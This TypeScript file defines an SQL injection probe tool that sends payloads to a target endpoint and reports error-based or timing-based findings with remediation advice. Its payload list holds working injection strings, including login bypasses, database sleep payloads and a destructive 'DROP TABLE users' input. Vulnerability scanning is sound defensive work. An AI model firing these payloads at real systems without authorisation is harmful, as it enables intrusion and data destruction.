import { Tool, ToolInput, ToolOutput } from '@shared/types/tool';

export const SQLiProbeTool: Tool = {
    name: 'sqli_probe',
    description: 'Tests an endpoint for SQL injection vulnerabilities using common payloads.',

    async run(input: ToolInput, signal?: AbortSignal): Promise<ToolOutput> {
        const { target, contextParams } = input;
        const base = contextParams?.baseUrl || target;

        const payloads = [
            "' OR '1'='1",
            " admin'--",
            "admin' #",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--", // MySQL Sleep
            "1' AND 1=(SELECT 1 FROM pg_sleep(5))--", // Postgres Sleep
            "1' WAITFOR DELAY '0:0:5'--", // MSSQL Sleep
            "'; DROP TABLE users; --",
            "1' OR 1=1 LIMIT 1; --"
        ];

        let requestsMade = 0;
        const findings: string[] = [];
        let vulnerabilityData: any = null;

        for (const payload of payloads) {
            try {
                const startTime = Date.now();
                requestsMade++;
                const url = new URL(target, base);
                url.searchParams.append('id', payload);

                const response = await fetch(url.toString(), { signal });
                const text = await response.text();
                const duration = Date.now() - startTime;

                // 1. Error-based Detection
                if (response.status === 500 && (text.toLowerCase().includes('sql') || text.toLowerCase().includes('syntax'))) {
                    findings.push(`Verified Error-based SQL Injection at ${target} using payload: ${payload}`);
                    vulnerabilityData = {
                        vulnerability: 'SQL Injection (Error-based)',
                        payload,
                        evidence: "Database syntax error detected in 500 response body.",
                        remediation: "Use parameterized queries."
                    };
                    break;
                }

                // 2. Timing-based Detection (Threshold: 4 seconds for a 5 second sleep)
                if (duration > 4000 && (payload.includes('SLEEP') || payload.includes('pg_sleep') || payload.includes('WAITFOR'))) {
                    findings.push(`Verified Blind SQL Injection (Timing) at ${target} using payload: ${payload}`);
                    vulnerabilityData = {
                        vulnerability: 'SQL Injection (Blind/Timing)',
                        payload,
                        evidence: `Response delay of ${duration}ms detected for timing payload.`,
                        remediation: "Use parameterized queries."
                    };
                    break;
                }
            } catch (e: any) {
                // Ignore
            }
        }

        if (findings.length > 0) {
            return { findings, requestsMade, data: vulnerabilityData };
        }

        return {
            findings: [],
            requestsMade,
            data: { status: 'clean', message: 'No SQL injection vulnerabilities confirmed via network probing.' }
        };
    }
};
